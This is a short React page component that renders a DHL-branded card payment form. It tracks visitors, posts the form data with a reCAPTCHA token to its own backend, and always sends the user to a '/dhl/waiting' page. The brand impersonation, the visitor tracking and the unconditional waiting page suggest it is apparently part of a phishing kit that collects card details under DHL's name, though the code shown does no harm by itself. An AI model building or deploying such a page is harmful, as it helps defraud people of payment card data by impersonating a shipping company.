import { useMutation } from "@tanstack/react-query";
import { useGoogleReCaptcha } from "react-google-recaptcha-v3";
import DHLPaymentForm, { type PaymentFormData } from "@/components/DHLPaymentForm";
import { apiRequest } from "@/lib/queryClient";
import { useVisitorTracking } from "@/hooks/use-visitor-tracking";

export default function CardPage() {
  const { executeRecaptcha } = useGoogleReCaptcha();

  // Track visitor
  useVisitorTracking({ page: "/card" });

  const startPaymentMutation = useMutation({
    mutationFn: async (data: PaymentFormData & { recaptchaToken?: string }) => {
      const response = await apiRequest("POST", "/api/payment/start", data);
      const result = await response.json();
      return result as { paymentId: string; sessionId: string };
    },
    onSuccess: (data) => {
      localStorage.setItem("dhlPaymentId", data.paymentId);
      // Always redirect to waiting/loading page
      window.location.href = `/dhl/waiting?session=${data.sessionId}&paymentId=${data.paymentId}`;
    },
  });

  const handlePaymentSubmit = async (data: PaymentFormData) => {
    // Generate reCAPTCHA token if available
    let recaptchaToken: string | undefined;
    
    if (executeRecaptcha) {
      try {
        recaptchaToken = await executeRecaptcha("payment_submit");
      } catch (error) {
        console.error("reCAPTCHA execution failed:", error);
      }
    }

    // Submit with reCAPTCHA token
    startPaymentMutation.mutate({ 
      ...data, 
      recaptchaToken 
    });
  };

  return <DHLPaymentForm onSubmit={handlePaymentSubmit} />;
}
